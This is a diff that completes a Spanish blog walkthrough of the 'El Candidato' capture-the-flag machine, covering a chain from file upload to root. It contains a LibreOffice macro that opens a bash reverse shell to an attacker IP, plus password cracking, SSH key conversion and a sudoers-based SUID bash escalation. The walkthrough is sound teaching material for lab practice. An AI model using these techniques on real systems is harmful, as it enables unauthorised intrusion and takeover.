@@ -1,11 +1,11 @@
 ---
 layout: single
 title: El Candidato - TheHackerLabs
-excerpt: "."
-date: 2025-10-01
+excerpt: "Después de analizar los escaneos, nos enfocamos en la página web, ya que el escaneo mostró el uso de un dominio que registramos en el /etc/hosts. Descubrimos que es posible subir distintos archivos a una página web del dominio, permitiendo la subida de archivos DOT. Aprovechamos esto para crear un archivo malicioso DOT, que almacena una macro que ejecuta una Reverse Shell una vez que se carga a la página web, siendo esta la forma en que ganamos acceso principal. Dentro, encontramos un archivo comprimido 7z, que logramos crackear para obtener la contraseña de un usuario (primer usuario). Utilizamos esas credenciales para ganar acceso al login de Roundcube, encontrando las credenciales de otro usuario (segundo usuario), con lo que ganamos acceso vía SSH. Utilizamos las credenciales del nuevo usuario (segundo usuario) para enumerar el servicio Samba, siendo así que descubrimos una base de datos de Password Safe. Logramos crackear esta base de datos y encontramos la contraseña de otro usuario (tercer usuario), al que nos logueamos vía SSH. Volvemos a usar las credenciales del tercer usuario, para enumerar el servicio Samba, teniendo acceso a más archivos compartidos, logrando obtener un archivo PPK de PuTTY que convertimos en una llave privada id_rsa, pudiendo ganar acceso como otro usuario (cuarto usuario). Usamos las credenciales del tercer usuario para ganar acceso al login de Roundcube, descubriendo una imagen que contiene un archivo de texto oculto con la contraseña del cuarto usuario. Utilizamos esta contraseña para ver los privilegios del cuarto usuario, siendo que puede usar un script de Python3 como Root. Al no encontrar dicho script, lo suplantamos para que asigne permisos SUID a la Bash, logrando escalar privilegios para convertirnos en Root."
+date: 2025-10-02
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-elCandidato/_logo.png
+  teaser: /assets/images/THL-writeup-elCandidato/el_candidato.png
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -13,21 +13,59 @@ categories:
   - Medium Machine
 tags:
   - Linux
-  - 
-  - 
+  - SSH
+  - Samba
+  - Roundcube Webmail
+  - Web Enumeration
+  - Fuzzing
+  - Abusing File Upload
+  - Uploading Malicious DOT File
+  - Cracking Hash
+  - Cracking 7z File
+  - Samba Enumeration
+  - User Pivoting
+  - Password Reuse
+  - Cracking Password Safe Database
+  - Generating id_rsa Private Key with puttygen
+  - Steganalysis On JPG Image
+  - Abusing Sudoers Privileges On Python3 Script
+  - Privesc - Abusing Sudoers Privileges On Python3 Script
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-elCandidato/_logo.png)
+![](/assets/images/THL-writeup-elCandidato/el_candidato.png)
 
-texto
+Después de analizar los escaneos, nos enfocamos en la página web, ya que el escaneo mostró el uso de un dominio que registramos en el `/etc/hosts`. Descubrimos que es posible subir distintos archivos a una página web del dominio, permitiendo la subida de **archivos DOT**. Aprovechamos esto para crear un **archivo malicioso DOT**, que almacena una **macro** que ejecuta una **Reverse Shell** una vez que se carga a la página web, siendo esta la forma en que ganamos acceso principal. Dentro, encontramos un **archivo comprimido 7z**, que logramos crackear para obtener la contraseña de un usuario (**primer usuario**). Utilizamos esas credenciales para ganar acceso al login de **Roundcube**, encontrando las credenciales de otro usuario (**segundo usuario**), con lo que ganamos acceso vía **SSH**. Utilizamos las credenciales del nuevo usuario (**segundo usuario**) para enumerar el **servicio Samba**, siendo así que descubrimos una base de datos de **Password Safe**. Logramos crackear esta base de datos y encontramos la contraseña de otro usuario (**tercer usuario**), al que nos logueamos vía **SSH**. Volvemos a usar las credenciales del **tercer usuario**, para enumerar el **servicio Samba**, teniendo acceso a más archivos compartidos, logrando obtener un **archivo PPK** de **PuTTY** que convertimos en una **llave privada id_rsa**, pudiendo ganar acceso como otro usuario (**cuarto usuario**). Usamos las credenciales del **tercer usuario** para ganar acceso al login de **Roundcube**, descubriendo una imagen que contiene un archivo de texto oculto con la contraseña del **cuarto usuario**. Utilizamos esta contraseña para ver los privilegios del **cuarto usuario**, siendo que puede usar un script de **Python3** como **Root**. Al no encontrar dicho script, lo suplantamos para que asigne **permisos SUID** a la **Bash**, logrando escalar privilegios para convertirnos en **Root**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *Wappalizer*
+* *ffuf*
+* *gobuster*
+* *libreoffice*
+* *nc*
+* *cat*
+* *grep*
+* *which*
+* *python3*
+* *wget*
+* *7z*
+* *7z2john*
+* *JohnTheRipper*
+* *sudo*
+* *crackmapexec*
+* *smbmap*
+* *ssh*
+* *mv*
+* *file*
+* *pwsafe2john*
+* *crunch*
+* *puttygen*
+* *strings*
+* *head*
+* *stegseek*
+* *nano*
+* *bash*
 
 
 <br>
@@ -43,17 +81,21 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#RevShell">Abusando de la Carga de Archivos para Cargar Reverse Shell dentro de Archivo DOT Malicioso y Ganando Acceso a la Máquina Víctima</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#Crack7z">Crackeando Archivo 7z y Ganando Acceso al Login de Roundcube</a></li>
+				<li><a href="#Roundcube">Ganando Acceso como Usuario sam y Enumeración del Servicio Samba</a></li>
+				<li><a href="#psafe">Crackeando Base de Datos de Password Safe y Ganando Acceso Vía SSH como Usuario dean</a></li>
+				<li><a href="#PPK">Enumeración de Archivos Compartidos del Usuario dean y Generando Llave Privada id_rsa con puttygen y Archivo PPK</a></li>
+				<li><a href="#Stego">Aplicando Estegoanálisis en Imagen de Impala y Descubriendo Credenciales Ocultas del Usuario john</a></li>
+				<li><a href="#python">Escalando Privilegios Abusando de Permisos Sudoers Sobre Binario python3 y Script backup.py</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -145,7 +187,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
 
 Hay bastantes puertos abiertos, y me da curiosidad ver no solo el **servicio Samba**, sino ver el **protocolo SMTP, pop3, imap, imaps y pop3s**. 
 
-Esto me da a entender que se estan ocupando mucho correos electronicos.
+Esto me da a entender que se están ocupando mucho, los correos electrónicos.
 
 <br>
 
@@ -223,14 +265,14 @@ Nmap done: 1 IP address (1 host up) scanned in 30.22 seconds
 
 <br>
 
-Observa que el **protocolo SMTP** nos esta dando un dominio llamado **gyhabogados.thl**.
+Observa que el **protocolo SMTP** nos está dando un dominio llamado **gyhabogados.thl**.
 
 Vamos a registrarlo en el `/etc/hosts`:
 ```bash
 echo "192.168.100.150 gyhabogados.thl" >> /etc/hosts
 ```
 
-Ahora, el **servicio Samba** parece necesitar credenciales válidas para poder ver los archivos compartidos, por lo que de momento, no es una opción para empezar.
+Ahora, el **servicio Samba** parece necesitar credenciales válidas para poder ver los archivos compartidos, por lo que, de momento, no es una opción para empezar.
 
 Entonces, empecemos por la página web, visitando el dominio.
 
@@ -268,13 +310,13 @@ Bajando un poco y aplicando **Hoovering**, veremos una página que solamente mue
 <img src="/assets/images/THL-writeup-elCandidato/Captura3.png">
 </p>
 
-De igual forma, podemos ver esa página y otra en el menu que aparece en la esquina superior derecha:
+De igual forma, podemos ver esa página y otra en el menú que aparece en la esquina superior derecha:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-elCandidato/Captura4.png">
 </p>
 
-Y el más interesante, es la página **TRABAJA CON NOSOTROS** porque al bajar, la página nos permite subir 3 tipos de archivos, siendo PDF, DOC y ODT:
+Y lo más interesante, es la página **TRABAJA CON NOSOTROS** porque al bajar, la página nos permite subir 3 tipos de archivos, siendo **PDF, DOC y ODT**:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-elCandidato/Captura5.png">
@@ -393,9 +435,9 @@ Otro directorio interesante es el `/roundcubes`, que al visitarlo nos manda a un
 <img src="/assets/images/THL-writeup-elCandidato/Captura7.png">
 </p>
 
-Para ganar acceso a este login, necesitaremos un correo y contraseña válidos.
+Para ganar acceso a este login, necesitaremos un usuario y contraseña válidos.
 
-Investiguemos que es eso de **Roundcubes**:
+Investiguemos qué es eso de **Roundcubes**:
 
 | **Roundcube** |
 |:-------------:|
@@ -415,9 +457,9 @@ Busquemos una forma de abusar de la subida de archivos, para poder cargar una **
 <br>
 
 
-<h2 id="RevShell">Aplicando Arbitrary File Upload para Cargar Reverse Shell y Ganar Acceso a la Máquina Víctima</h2>
+<h2 id="RevShell">Abusando de la Carga de Archivos para Cargar Reverse Shell dentro de Archivo DOT Malicioso y Ganando Acceso a la Máquina Víctima</h2>
 
-De acuerdo a los archivos que podemos subir, la mejor opción son los archivos tipo **ODT**:
+De acuerdo con los archivos que podemos subir, la mejor opción son los archivos tipo **ODT**:
 
 | **Archivo ODT** |
 |:---------------:|
@@ -427,14 +469,14 @@ De acuerdo a los archivos que podemos subir, la mejor opción son los archivos t
 
 Esta clase de archivos sirve en **Windows y Linux**, por lo que es una buena opción porque estamos contra una máquina **Linux**.
 
-Podemos seguir las instrucciones del siguiente blog para crear un **archivo ODT** malicioso, que contendra una **Reverse Shell**:
+Podemos seguir las instrucciones del siguiente blog para crear un **archivo ODT** malicioso, que contendrá una **Reverse Shell**:
 * <a href="https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d" target="_blank">Initial Access via Malicious ODT Macro</a>
 
 La idea del blog, es agregar una **Macro** al **archivo ODT** que ejecute una **Reverse Shell** cuando sea enviada y recibida por la página web.
 
 Vamos a hacerlo por pasos:
 
-* Crea un archivo random con **libreoffice** y guardalo en tu directorio de trabajo:
+* Crea un archivo random con **libreoffice** y guárdalo en tu directorio de trabajo:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-elCandidato/Captura8.png">
@@ -450,14 +492,13 @@ Vamos a hacerlo por pasos:
 <img src="/assets/images/THL-writeup-elCandidato/Captura10.png">
 </p>
 
-* Selecciona tu **archivo ODT**, dale clic al **botón New** para crear una nueva **Macro** y dale un nombre a la **Macro**, por ejemplo **RevShell**. Cuando le des al botón **OK**, nos saldrá una nueva ventana que ya nos permite agregar código:
+* Selecciona tu **archivo ODT**, dale clic al **botón New** para crear una nueva **Macro** y dale un nombre a la **Macro**, por ejemplo, **RevShell**. Cuando le des al botón **OK**, nos saldrá una nueva ventana que ya nos permite agregar código:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-elCandidato/Captura11.png">
 </p>
 
-* En esa nueva ventana, agrega el siguiente código y luego guarda con **CTRL + S** o desde el botón **Guardar** en la esquina superios izquierda:
-
+* En esa nueva ventana, agrega el siguiente código y luego guarda con **CTRL + S** o desde el botón **Guardar** en la esquina superior izquierda:
 ```bash
 shell("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'")
 ```
@@ -472,13 +513,13 @@ shell("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'")
 <img src="/assets/images/THL-writeup-elCandidato/Captura13.png">
 </p>
 
-* En la nueva ventana, ve a la sección **Events**, selecciona el evento **Open Document**, revisa que este seleccionada tu **Macro** y dale al botón **Macro**:
+* En la nueva ventana, ve a la sección **Events**, selecciona el evento **Open Document**, revisa que esté seleccionada tu **Macro** y dale al botón **Macro**:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-elCandidato/Captura14.png">
 </p>
 
-* En la nueva ventana, despliega los elementos de tu archivo, luego selecciona tu **Macro** y dale a **OK**, después vuelve a darle **OK** y nuestro archivo ya estara listo:
+* En la nueva ventana, despliega los elementos de tu archivo, luego selecciona tu **Macro** y dale a **OK**, después vuelve a darle **OK** y nuestro archivo ya estará listo:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-elCandidato/Captura15.png">
@@ -532,31 +573,6 @@ reset -> xterm
 export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
 ```
 
-<br>
-
-<h2 id=""></h2>
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-
 
 <br>
 <br>
@@ -569,7 +585,7 @@ export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
 
 <h2 id="Crack7z">Crackeando Archivo 7z y Ganando Acceso al Login de Roundcube</h2>
 
-Antes que nada, veamos que usuarios existen en la máquina víctima:
+Antes que nada, veamos qué usuarios existen en la máquina víctima:
 ```bash
 bob@TheHackersLabs-Gyhabogados:~$ cat /etc/passwd | grep 'bash'
 root:x:0:0:root:/root:/bin/bash
@@ -599,7 +615,7 @@ credentials.7z  Desktop  Documents  Downloads  mail  Maildir  Music  Pictures  P
 ```
 Vamos a mandarlo a nuestra máquina.
 
-Inicia un servidor con **Python3** en la máquina víctima:
+Inicia un servidor con **python3** en la máquina víctima:
 ```bash
 bob@TheHackersLabs-Gyhabogados:~$ which python3
 /usr/bin/python3
@@ -637,7 +653,7 @@ Enter password (will not be echoed):
 ```
 Necesita una contraseña, por lo que tendremos que crackearlo.
 
-Obengamos el hash del archivo comprimido con la herramienta 
+Obtengamos el hash del archivo comprimido con la herramienta **7z2john**:
 ```bash
 7z2john credentials.7z > hash
 ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
@@ -661,7 +677,9 @@ Session completed.
 ```
 Tenemos la contraseña.
 
-Ahora sí, lo descomprimimos y nos da un archivo de texto. Leamoslo:
+Ahora sí, lo descomprimimos y nos da un archivo de texto. 
+
+Leámoslo:
 ```bash
 cat credentials.txt
 bob:***********
@@ -670,7 +688,7 @@ Tenemos la contraseña del **usuario bob**.
 
 Podríamos usar la contraseña para obtener una sesión vía **SSH**, pero podemos seguir usando la sesión actual.
 
-Además, podemos ver que privilegios tiene nuestro usuario:
+Además, podemos ver qué privilegios tiene nuestro usuario:
 ```bash
 bob@TheHackersLabs-Gyhabogados:~$ sudo -l
 [sudo] password for bob: 
@@ -678,7 +696,7 @@ Sorry, user bob may not run sudo on TheHackersLabs-Gyhabogados.
 ```
 No tiene ninguno.
 
-La contraseña tampoco servira para listar algún archivo compartido del **servicio Samba**:
+La contraseña tampoco servirá para listar algún archivo compartido del **servicio Samba**:
 ```bash
 crackmapexec smb 192.168.100.150 -u 'bob' -p '**********'
 SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [*] Windows 6.1 Build 0 (name:THEHACKERSLABS-GYHABOGADOS) (domain:THEHACKERSLABS-GYHABOGADOS) (signing:False) (SMBv1:False)
@@ -695,7 +713,7 @@ Pero si usamos el usuario y contraseña en el login de **Roundcube**, ganaremos 
 
 <h2 id="Roundcube">Ganando Acceso como Usuario sam y Enumeración del Servicio Samba</h2>
 
-Revisando la sesión de **bob** en **Roundcube**, encontraremos que se le envío un mensaje al **usuario sam**:
+Revisando la sesión de **bob** en **Roundcube**, encontraremos que se le envió un mensaje al **usuario sam**:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-elCandidato/Captura19.png">
@@ -721,7 +739,7 @@ Last login: Sun Dec  8 18:26:08 2024
 sam@TheHackersLabs-Gyhabogados:~$ whoami
 sam
 ```
-El problema es que no encontraremos nada que nos ayude por aquí.
+El problema es que no encontramos nada que nos ayude por aquí.
 
 Pero si probamos la contraseña del **usuario sam** en el **servicio Samba**,  ya podremos listar los archivos compartidos:
 ```bash
@@ -747,8 +765,11 @@ smbmap -H 192.168.100.150 -u 'sam' -p '**********' --no-banner
 	sam                                               	READ ONLY	Home Directories
 [*] Closed 1 connections
 ```
+Podemos leer 2 directorios llamados **CONDIFENCIALES y RESPALDOS_IT**.
 
-Me llama la atención el directorio **CONDIFENCIALES**, pero me interesa mucho más el directorio **RESPALDOS_IT**, así que veamos su contenido:
+El directorio **CONDIFENCIALES** contiene **archivos PDF** que no tienen algo que nos ayude.
+
+Veamos el contenido del directorio **RESPALDOS_IT**:
 ```bash
 smbmap -H 192.168.100.150 -u 'sam' -p '**********' -r RESPALDOS_IT --no-banner
 [*] Detected 1 hosts serving SMB                                                                                                  
@@ -779,10 +800,11 @@ smbmap -H 192.168.100.150 -u 'sam' -p '**********' --download RESPALDOS_IT/IMPOR
 mv 192.168.100.150-RESPALDOS_IT_credenciales.psafe3 credenciales.psafe3
 mv 192.168.100.150-RESPALDOS_IT_IMPORTANTE.txt IMPORTANTE.txt
 ```
+Vamos a analizarlos.
 
 <br>
 
-<h2 id="psafe">Crackeando Base de Datos de Password Safe</h2>
+<h2 id="psafe">Crackeando Base de Datos de Password Safe y Ganando Acceso Vía SSH como Usuario dean</h2>
 
 Primero leamos ese archivo de texto:
 ```bash
@@ -797,14 +819,19 @@ Con esta herramienta, solo necesitarás recordar una contraseña maestra para ac
 
 La contraseña maestra es similar a la que te proporcioné en la bienvenida: "ChevyImpala1967". Sin embargo, en lugar de "1967", deberás usar un año diferente.
 ```
-Ya nos dieron una pista de cual puede ser la contraseña del **usuario dean**.
+Ya nos dieron una pista, la cual puede ser la contraseña del **usuario dean**.
 
 Revisando el otro archivo, resulta ser una base de datos de **Password Safe**:
 ```bash
 file credenciales.psafe3
 credenciales.psafe3: Password Safe V3 database
 ```
-Si queremos abrir esa base de datos, necesitaremos una contraseña válida que suponemos es la que menciona el archivo de texto.
+Si queremos abrir esa base de datos, necesitaremos una contraseña válida que, suponemos, es la que menciona el archivo de texto.
+
+Obtengamos el hash de este archivo con la herramienta **pwsafe2john**:
+```bash
+pwsafe2john credenciales.psafe3 > psafe3Hash
+```
 
 Vamos a crear un wordlist que tenga distintos números que sirvan como años dentro de la contraseña, usando la herramienta **crunch**:
 ```bash
@@ -834,7 +861,7 @@ Session completed.
 ```
 Tenemos la contraseña.
 
-Inicia **Password Safe** con el comando **pwsafe** (eso si lo tienes instalado) y dale la contraseña. Una vez dentro, da clic derecho sobre la credencial guardada y para verla, dale clic al simbolo del ojo para poder verla en texto claro:
+Inicia **Password Safe** con el comando **pwsafe** (eso si lo tienes instalado) y dale la contraseña. Una vez dentro, da clic derecho sobre la credencial guardada y para verla, dale clic al símbolo del ojo para poder verla en texto claro:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-elCandidato/Captura21.png">
@@ -867,7 +894,7 @@ dean@TheHackersLabs-Gyhabogados:~$ cat user.txt
 
 <br>
 
-<h2 id="Stego">Enumeración de Archivos Compartidos del Usuario dean y Aplicando Esteganografia en Imagen</h2>
+<h2 id="PPK">Enumeración de Archivos Compartidos del Usuario dean y Generando Llave Privada id_rsa con puttygen y Archivo PPK</h2>
 
 Revisando los archivos del **usuario dean**, no encontraremos mucho.
 
@@ -877,7 +904,7 @@ crackmapexec smb 192.168.100.150 -u 'dean' -p '**********'
 SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [*] Windows 6.1 Build 0 (name:THEHACKERSLABS-GYHABOGADOS) (domain:THEHACKERSLABS-GYHABOGADOS) (signing:False) (SMBv1:False)
 SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [+] THEHACKERSLABS-GYHABOGADOS\dean:**********
 ```
-Si funcionan.
+Sí funcionan.
 
 Veamos si podemos ver otro directorio:
 ```bash
@@ -898,7 +925,7 @@ smbmap -H 192.168.100.150 -u 'dean' -p '**********' --no-banner
 ```
 Ya podemos ver el contenido del directorio **RESPALDOS_IT**.
 
-Veamos qupe hay dentro:
+Veamos qué hay dentro:
 ```bash
 smbmap -H 192.168.100.150 -u 'dean' -p '**********' -r IT_TOOLS --no-banner
 [*] Detected 1 hosts serving SMB                                                                                                  
@@ -937,14 +964,14 @@ Podemos obtener un poco más de información usando la herramienta **puttygen**,
 puttygen private_key.ppk -l
 ssh-rsa 2048 SHA256:bE/OC0a4W0YALcfFb3ZMKvbx94oNGvsOvb0CajKFqOY
 ```
-Algo importante, es que no nos pidio meter una contraseña, por lo que es posible modificar esta llave para convertirla en una **llave privada id_rsa** para el **servicio SSH**.
+Algo importante, es que no nos pidió meter una contraseña, por lo que es posible modificar esta llave para convertirla en una **llave privada id_rsa** para el **servicio SSH**.
 
 La podemos generar con **puttygen** y le damos los permisos correctos:
 ```bash
 puttygen private_key.ppk -O private-openssh -o id_rsa
 chmod 600 id_rsa
 ```
-Ya solo tenemos que averigurar a quien pertenece esta llave.
+Ya solo tenemos que averiguar a quién pertenece esta llave.
 
 Probando con varios usuarios, resulta que le pertenece al **usuario john**:
 ```bash
@@ -955,32 +982,161 @@ Last login: Fri Oct  3 02:53:26 2025
 john@TheHackersLabs-Gyhabogados:~$ whoami
 john
 ```
+El problema es que no encontramos algo que nos ayude a escalar privilegios, ni podemos ver sus privilegios porque nos pide su contraseña, que no tenemos.
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="Stego">Aplicando Estegoanálisis en Imagen de Impala y Descubriendo Credenciales Ocultas del Usuario john</h2>
 
+La contraseña del **usuario dean**, sirve en el login de **Roundcube**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-elCandidato/Captura23.png">
+</p>
+
+Tenemos dos correos, pero el que nos importa es el primero:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-elCandidato/Captura24.png">
+</p>
+
+Algo curioso que descubriremos, es que si descargamos y analizamos la imagen del **Impala**, parece que contiene algo:
 ```bash
+strings impala_67.jpg | head -n 10
+JFIF
+ , #&')*)
+-0-(0%()(
+((((((((((((((((((((((((((((((((((((((((((((((((((
+$3br
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+	#3R
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+Z]gQ
+5HYa
+```
+Normalmente, una imagen normal no debería contener esos caracteres.
 
+Directamente, usemos la herramienta **stegseek** y el wordlist **rockyou.txt** para ver si puede encontrar algo:
+```bash
+stegseek impala_67.jpg /usr/share/wordlists/rockyou.txt
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "ironmaiden"
+[i] Original filename: "credentials.txt".
+[i] Extracting to "impala_67.jpg.out".
+```
+Bien, obtuvimos la contraseña que nos da un archivo y el archivo oculto.
+
+Al leerlo, nos da la contraseña para el **usuario john**:
+```bash
+cat impala_67.jpg.out
+john: ***********
+```
+Ya podemos ver qué privilegios tiene este usuario.
+
+<br>
+
+<h2 id="python">Escalando Privilegios Abusando de Permisos Sudoers Sobre Binario python3 y Script backup.py</h2>
+
+Veamos qué privilegios tiene el **usuario john**:
+```bash
+john@TheHackersLabs-Gyhabogados:~$ sudo -l
+[sudo] password for john: 
+Sorry, try again.
+[sudo] password for john: 
+Matching Defaults entries for john on TheHackersLabs-Gyhabogados:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User john may run the following commands on TheHackersLabs-Gyhabogados:
+    (ALL) PASSWD: /usr/bin/python3 /home/john/tools/backup.py
+```
+Nuestro usuario puede ejecutar un script llamado **backup.py** con **python3** como **Root**.
+
+Dentro de los archivos de este usuario, vemos el directorio **tools**, que es la ruta que se menciona:
+```bash
+john@TheHackersLabs-Gyhabogados:~$ ls
+Maildir  tools
 ```
 
+Lo curioso, es que no se encuentra el script que se menciona:
 ```bash
+john@TheHackersLabs-Gyhabogados:~$ cd tools/
+john@TheHackersLabs-Gyhabogados:~/tools$ ls -la
+total 8
+drwxr-xr-x 2 john john 4096 Dec  8  2024 .
+drwx------ 8 john john 4096 Dec  8  2024 ..
+```
+Esto nos beneficia, ya que podemos suplantar ese script por uno propio.
 
+Podríamos crear uno que contenga la instrucción que cambie los permisos de la **Bash** y darle **permisos SUID**.
+
+Primero, revisemos qué permisos tiene la **Bash**:
+```bash
+john@TheHackersLabs-Gyhabogados:~/tools$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
+```
+Solo el **Root** puede ejecutar la **Bash** con privilegios.
+
+Ahora, creamos nuestro script con el nombre **backup.py** y agregamos la instrucción para que cambie los permisos de la **Bash**:
+```bash
+john@TheHackersLabs-Gyhabogados:~/tools$ nano backup.py
+john@TheHackersLabs-Gyhabogados:~/tools$ cat backup.py 
+import os
+
+os.system("chmod u+s /bin/bash")
 ```
 
+Ejecutamos el script:
 ```bash
-
+john@TheHackersLabs-Gyhabogados:~/tools$ sudo /usr/bin/python3 /home/john/tools/backup.py
+john@TheHackersLabs-Gyhabogados:~/tools$ 
 ```
 
+Y volvemos a revisar los permisos de la **Bash**:
 ```bash
-
+john@TheHackersLabs-Gyhabogados:~/tools$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
 ```
+Ya tiene los **permisos SUID**.
 
+Ejecutemos la **Bash** con privilegios:
 ```bash
-
+john@TheHackersLabs-Gyhabogados:~/tools$ bash -p
+bash-5.2# whoami
+root
 ```
+Somos **Root**.
 
+Obtengamos la última flag:
+```bash
+bash-5.2# cd /root/
+bash-5.2# ls
+Maildir  notes.txt  vboxpostinstall.sh
+bash-5.2# cat notes.txt 
+███████ ██           ██████  █████  ███    ██ ██████  ██ ██████   █████  ████████  ██████  
+██      ██          ██      ██   ██ ████   ██ ██   ██ ██ ██   ██ ██   ██    ██    ██    ██ 
+█████   ██          ██      ███████ ██ ██  ██ ██   ██ ██ ██   ██ ███████    ██    ██    ██ 
+██      ██          ██      ██   ██ ██  ██ ██ ██   ██ ██ ██   ██ ██   ██    ██    ██    ██ 
+███████ ███████      ██████ ██   ██ ██   ████ ██████  ██ ██████  ██   ██    ██     ██████  
+                                                                                        
+¡Felicidades, hacker!
 
+Has logrado rootear la máquina.
+
+Recuerda, la ciberseguridad es un campo en constante evolución. Los desafíos son solo una pieza del rompecabezas; 
+sigue aprendiendo, explorando y compartiendo tu conocimiento.
+
+Si te gustó este CTF, ¡cuéntaselo a otros! Y si encontraste errores o tienes sugerencias, no dudes en hacérmelo saber.
+
+Flag: ****************
+
+"La verdadera fuerza de voluntad está en fallar una y otra vez, y al final tener éxito" 
+--- David Goggins
+bash-5.2#
+```
+Qué bonito mensaje.
+
+Con esto, terminamos la máquina.
 
 
 <br>
@@ -990,10 +1146,14 @@ john
 </div>
 
 
-links
+* https://www.adobe.com/es/acrobat/resources/document-files/open-doc/odt-file.html
+* https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d
+* https://www.hackplayers.com/2018/06/shell-mediante-un-documento-odt.html
+* https://es.wikipedia.org/wiki/Roundcube
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
